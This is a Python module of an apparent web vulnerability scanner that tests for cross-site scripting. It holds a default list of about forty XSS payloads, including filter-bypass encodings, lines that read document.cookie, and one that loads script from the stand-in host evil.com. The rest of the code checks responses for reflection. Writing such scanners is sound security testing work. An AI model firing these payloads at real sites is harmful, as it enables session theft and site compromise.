"""
Cross-Site Scripting (XSS) tester module.
"""

import re
from pathlib import Path
from .base_tester import BaseTester

class XSSTester(BaseTester):
    """Cross-Site Scripting vulnerability tester."""
    
    def __init__(self, config):
        """Initialize XSS tester."""
        super().__init__(config)
        self.vulnerability_type = "Cross-Site Scripting (XSS)"
    
    def load_payloads(self):
        """Load XSS payloads from file."""
        payload_file = Path(__file__).parent.parent / 'payloads' / 'xss.txt'
        
        try:
            with open(payload_file, 'r') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            return payloads
        except FileNotFoundError:
            # Return default payloads if file doesn't exist
            return [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>",
                "<video><source onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "javascript:alert('XSS')",
                "'><script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>",
                "</script><script>alert('XSS')</script>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<script>alert(/XSS/)</script>",
                "<script>alert`XSS`</script>",
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<script>confirm('XSS')</script>",
                "<script>prompt('XSS')</script>",
                "<script src=//evil.com/xss.js></script>",
                "<<SCRIPT>alert('XSS');//<</SCRIPT>",
                "<IMG SRC=\"javascript:alert('XSS');\">",
                "<IMG SRC=javascript:alert('XSS')>",
                "<IMG SRC=JaVaScRiPt:alert('XSS')>",
                "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
                "<a onmouseover=\"alert(document.cookie)\">xxs link</a>",
                "<a onmouseover=alert(document.cookie)>xxs link</a>",
                "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
                "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
                "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
                "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
                "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
                "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
                "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
                "perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out"
            ]
    
    def analyze_response(self, payload, response):
        """Analyze response for XSS vulnerabilities."""
        if response.get('error'):
            return
        
        response_body = response.get('response_body', '')
        status_code = response.get('status_code')
        
        # Check if the payload is reflected in the response without proper encoding
        if self._is_payload_reflected(payload, response_body):
            self.add_finding(
                self.vulnerability_type,
                payload,
                response,
                "XSS payload reflected in response without proper sanitization",
                'High'
            )
            return
        
        # Check for partial reflection (payload might be partially sanitized)
        if self._is_payload_partially_reflected(payload, response_body):
            self.add_finding(
                self.vulnerability_type,
                payload,
                response,
                "XSS payload partially reflected - potential filter bypass",
                'Medium'
            )
            return
        
        # Check for JavaScript execution context
        if self._check_javascript_context(payload, response_body):
            self.add_finding(
                self.vulnerability_type,
                payload,
                response,
                "Payload appears in JavaScript execution context",
                'High'
            )
            return
        
        # Check for HTML attribute context
        if self._check_html_attribute_context(payload, response_body):
            self.add_finding(
                self.vulnerability_type,
                payload,
                response,
                "Payload appears in HTML attribute context",
                'Medium'
            )
    
    def _is_payload_reflected(self, payload, response_body):
        """Check if the payload is directly reflected in the response."""
        # Remove common HTML encoding to check for direct reflection
        decoded_response = response_body.replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"').replace('&#x27;', "'").replace('&amp;', '&')
        
        # Check for exact match
        if payload in response_body or payload in decoded_response:
            return True
        
        # Check for case-insensitive match for script tags
        if '<script' in payload.lower() and '<script' in response_body.lower():
            return True
        
        return False
    
    def _is_payload_partially_reflected(self, payload, response_body):
        """Check if parts of the payload are reflected."""
        # Extract key XSS components from payload
        xss_keywords = ['script', 'alert', 'onerror', 'onload', 'javascript', 'svg', 'img', 'iframe']
        
        payload_lower = payload.lower()
        response_lower = response_body.lower()
        
        reflected_keywords = 0
        for keyword in xss_keywords:
            if keyword in payload_lower and keyword in response_lower:
                reflected_keywords += 1
        
        # If multiple XSS keywords are reflected, it might be a partial reflection
        return reflected_keywords >= 2
    
    def _check_javascript_context(self, payload, response_body):
        """Check if payload appears in JavaScript context."""
        # Look for patterns where the payload might be in JavaScript
        js_patterns = [
            r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>',
            r'javascript:.*?' + re.escape(payload),
            r'on\w+\s*=\s*["\'].*?' + re.escape(payload)
        ]
        
        for pattern in js_patterns:
            if re.search(pattern, response_body, re.IGNORECASE | re.DOTALL):
                return True
        
        return False
    
    def _check_html_attribute_context(self, payload, response_body):
        """Check if payload appears in HTML attribute context."""
        # Look for patterns where payload is in HTML attributes
        attr_patterns = [
            r'<[^>]+\s+\w+\s*=\s*["\'].*?' + re.escape(payload) + r'.*?["\'][^>]*>',
            r'<[^>]+\s+' + re.escape(payload) + r'\s*=[^>]*>'
        ]
        
        for pattern in attr_patterns:
            if re.search(pattern, response_body, re.IGNORECASE):
                return True
        
        return False